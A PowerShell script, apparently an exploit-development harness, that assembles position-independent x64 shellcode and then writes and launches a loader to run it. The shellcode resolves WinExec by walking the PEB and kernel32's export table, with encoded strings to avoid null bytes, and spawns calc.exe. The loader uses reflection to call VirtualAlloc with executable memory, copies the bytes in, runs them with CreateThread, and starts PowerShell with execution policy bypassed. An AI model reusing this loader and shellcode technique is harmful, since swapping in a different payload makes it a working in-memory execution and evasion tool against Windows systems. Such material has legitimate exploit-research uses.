# Architecture
$architecture = 64
#$architecture = 32

# List of bad Bytes
# $badBytes = @('00', 'B8')
$badBytes = @('00')

# Your inline shellcode
$shellcode = @"
BITS $architecture
SECTION .text
global main
main:
sub rsp, 0x28
and rsp, 0xFFFFFFFFFFFFFFF0
xor rcx, rcx             ; RCX = 0
mov rax, [gs:rcx + 0x60] ; RAX = PEB
mov rax, [rax + 0x18]    ; RAX = PEB->Ldr
mov rsi,[rax+0x10]       ;PEB.Ldr->InLoadOrderModuleList
mov rsi, [rsi]
mov rsi,[rsi]
mov rbx, [rsi+0x30]      ;kernel32.dll base address
mov r8, rbx              ; mov kernel32.dll base addr into r8
;Code for parsing Export Address Table
mov ebx, [rbx+0x3C]           ; Get Kernel32 PE Signature (offset 0x3C) into EBX
add rbx, r8                   ; Add signature offset to kernel32 base. Store in RBX.
xor rcx, rcx                  ; Avoid null bytes from mov edx,[rbx+0x88] by using rcx register to add
add cx, 0x88ff
shr rcx, 0x8                  ; RCX = 0x88ff --> 0x88
mov edx, [rbx+rcx]            ; EDX = [&NewEXEHeader + Offset RVA ExportTable] = RVA ExportTable
add rdx, r8                   ; RDX = kernel32.dll + RVA ExportTable = ExportTable Address
mov r10d, [rdx+0x14]          ; Number of functions
xor r11, r11                  ; Zero R11 before use
mov r11d, [rdx+0x20]          ; AddressOfNames RVA
add r11, r8                   ; AddressOfNames VMA
mov rcx, r10                  ; Set loop counter
mov rax, 0x6F9C9A87BA9196A8   ; WinExec 'encoded'
not rax
shl rax, 0x8
shr rax, 0x8
push rax
mov rax, rsp	
add rsp, 0x8
kernel32findfunction:             ; Loop over Export Address Table to find WinApi names
    jecxz FunctionNameNotFound    ; Loop around this function until we find WinExec
    xor ebx,ebx                   ; Zero EBX for use
    mov ebx, [r11+rcx*4]          ; EBX = RVA for first AddressOfName
    add rbx, r8                   ; RBX = Function name VMA / add kernel32 base address to RVA and get WinApi name
    dec rcx                       ; Decrement our loop by one, this goes from Z to A
    mov r9, qword [rax]                ; R9 = "our API"
    cmp [rbx], r9                      ; Compare all bytes
    jz FunctionNameFound               ; If match, function found
	jnz kernel32findfunction
FunctionNameNotFound:
int3
FunctionNameFound:                ; Get function address from AddressOfFunctions
   inc ecx                        ; increase counter by 1 to account for decrement in loop
   xor r11, r11
   mov r11d, [rdx+0x1c]           ; AddressOfFunctions RVA
   add r11, r8                    ; AddressOfFunctions VMA in R11. Kernel32+RVA for addressoffunctions
   mov r15d, [r11+rcx*4]          ; Get the function RVA.
   add r15, r8                    ; Found the Winexec WinApi and all the while skipping ordinal lookup! w00t!
   xor rax, rax
   push rax
   mov rax, 0x9A879AD19C939E9C    ; encoded calc.exe ;)
   not rax
   push rax
   mov rcx, rsp	                 
   xor rdx, rdx
   inc rdx
   sub rsp, 0x30
   call r15                       ; Call WinExec
"@



# File paths
$asmPath = "$env:TEMP\shellcode.asm"
$lstPath = "$env:TEMP\shellcode.lst"
$nasmPath = "C:\Program Files\NASM\nasm.exe"

# Write shellcode to file
Set-Content -Path $asmPath -Value $shellcode

# Assemble with NASM
& "$nasmPath" -fbin -l $lstPath $asmPath

$allLines = Get-Content $lstPath
$parsed = @()
$pending = $null
$pendingAddr = $null
$pendingInstr = $null

foreach ($line in $allLines) {
    if ($line -match '^\s*\d+\s+([0-9A-F]+)\s+([0-9A-Fa-f]+)(-?)(\s+.*)') {
        $addr = $matches[1]
        $hexRaw = $matches[2].ToUpper()
        $continuation = $matches[3]
        $instr = $matches[4].Trim()

        # If we are in a continuation, append the hex codes
        if ($pending -ne $null) {
            # Append new hex part
            $pending += $hexRaw
            # Optionally append instruction text or check consistency
            if ($continuation -eq "-") {
                # Still a continuation, skip processing
                continue
            } else {
                # No further continuation, prepare to add the full record
                $combinedHex = $pending
                $parsed += [PSCustomObject]@{
                    Address   = $pendingAddr
                    HexSpaced = ($combinedHex -split '(?<=\G.{2})') -join ' '
                    Instr     = $pendingInstr
                }
                # Clear pending variables
                $pending = $null
                $pendingAddr = $null
                $pendingInstr = $null
            }
        } else {
            # Not in a pending continuation.
            if ($continuation -eq "-") {
                # Start a new pending accumulation.
                $pending = $hexRaw
                $pendingAddr = $addr
                $pendingInstr = $instr  # or combine if needed
                continue
            }
            else {
                # No continuation, process as a single line.
                $parsed += [PSCustomObject]@{
                    Address   = $addr
                    HexSpaced = ($hexRaw -split '(?<=\G.{2})') -join ' '
                    Instr     = $instr
                }
            }
        }
    }
}

# Now output the parsed instructions:
$maxLeft = ($parsed | ForEach-Object {
    ("{0}  {1,-20}  {2}" -f $_.Address, $_.HexSpaced, $_.Instr).Length
} | Measure-Object -Maximum).Maximum

foreach ($entry in $parsed) {
    $left = "{0}  {1,-20}  {2}" -f $entry.Address, $entry.HexSpaced, $entry.Instr
    $pad = ' ' * ($maxLeft - $left.Length)
    if ($entry.BadBytes -and $entry.BadBytes.Count -gt 0) {
        $whichBad = ($entry.BadBytes -join ' ')
        $marker = "<-- BAD BYTE: $whichBad"
        Write-Host "$left$pad  $marker" -ForegroundColor Red
    } else {
        Write-Host "$left$pad"
    }
}

# Determine max length for alignment
$maxLeft = ($parsed | ForEach-Object {
    ("{0}  {1,-20}  {2}" -f $_.Address, $_.HexSpaced, $_.Instr).Length
} | Measure-Object -Maximum).Maximum

# Output lines
foreach ($entry in $parsed) {
    $left = "{0}  {1,-20}  {2}" -f $entry.Address, $entry.HexSpaced, $entry.Instr
    $pad = ' ' * ($maxLeft - $left.Length)

    if ($entry.BadBytes.Count -gt 0) {
        $whichBad = ($entry.BadBytes -join ' ')
        $marker = "<-- BAD BYTE: $whichBad"
        Write-Host "$left$pad  $marker" -ForegroundColor Red
    } else {
        Write-Host "$left$pad"
    }
}


# Dynamically build the shellcode byte array from the parsed listing

# Initialize an empty array to hold each shellcode byte (in hex format)
$shellcodeBytesArray = @()
foreach ($entry in $parsed) {
    # Split the HexSpaced field into individual hex byte tokens
    $bytes = $entry.HexSpaced -split '\s+'
    foreach ($byte in $bytes) {
        # Make sure the byte is not empty
        if (![string]::IsNullOrWhiteSpace($byte)) {
            # Prepend "0x" to each byte so it can be interpreted as a hexadecimal number.
            $shellcodeBytesArray += "0x$byte"
        }
    }
}


# Prepare the final PowerShell execution script dynamically.
$joinedShellcode = $shellcodeBytesArray -join ', '

# Generate a PowerShell script string
$execScript = @"
Write-Host "Current Process ID: `$PID"
Write-Host "Press any key to enter shellcode..."
[void][System.Console]::ReadKey(`$true)


[Byte[]] `$shellcode = @($joinedShellcode)


function LookupFunc {
    Param (`$moduleName, `$functionName)
    `$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { `$_.GlobalAssemblyCache -And `$_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    `$tmp = `$assem.GetMethods() | ForEach-Object { if (`$_.Name -eq "GetProcAddress") { `$_ } }
    `$handle = `$assem.GetMethod('GetModuleHandle').Invoke(`$null, @(`$moduleName))
    [IntPtr] `$result = 0
    try {
        Write-Host "First Invoke - `$moduleName `$functionName"
        `$result = `$tmp[0].Invoke(`$null, @(`$handle, `$functionName))
    } catch {
        Write-Host "Second Invoke - `$moduleName `$functionName"
        `$handle = New-Object -TypeName System.Runtime.InteropServices.HandleRef -ArgumentList @(`$null, `$handle)
        `$result = `$tmp[0].Invoke(`$null, @(`$handle, `$functionName))
    }
    return `$result
}

function getDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = `$True)] [Type[]] `$func,
        [Parameter(Position = 1)] [Type] `$delType = [Void]
    )
    `$type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', `$false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    `$type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, `$func).SetImplementationFlags('Runtime, Managed')
    `$type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', `$delType, `$func).SetImplementationFlags('Runtime, Managed')
    return `$type.CreateType()
}

`$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke([IntPtr]::Zero, `$shellcode.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy(`$shellcode, 0, `$lpMem, `$shellcode.Length)
`$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr])([IntPtr]))).Invoke([IntPtr]::Zero, 0, `$lpMem, [IntPtr]::Zero, 0, [IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32])([Int]))).Invoke(`$hThread, 0xFFFFFFFF)

"@

$execPath = "$env:TEMP\run_payload.ps1"
Set-Content -Path $execPath -Value $execScript



# Define the typical locations on a 64-bit Windows system:
$PS64 = "$env:windir\system32\WindowsPowerShell\v1.0\powershell.exe"    # 64-bit version
$PS32 = "$env:windir\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"      # 32-bit version

# Select the target executable based on the $architecture variable.
# Note: This script chooses the opposite architecture.
if ($architecture -eq 64) {
    # $architecture = 32 means launch the 64-bit (system32) version
    $targetExe = $PS64
    Write-Host "Launching Shellcode in 64-Bit Process."
} elseif ($architecture -eq 32) {
    # $architecture = 64 means launch the 32-bit (SysWOW64) version
    $targetExe = $PS32
    Write-Host "Launching Shellcode in 32-Bit Process.."
} else {
    Write-Error "Invalid architecture specified. Please use 32 or 64."
    exit
}

# Start in new PowerShell process
Start-Process $targetExe -ArgumentList "-ExecutionPolicy Bypass -NoExit -File `"$execPath`""
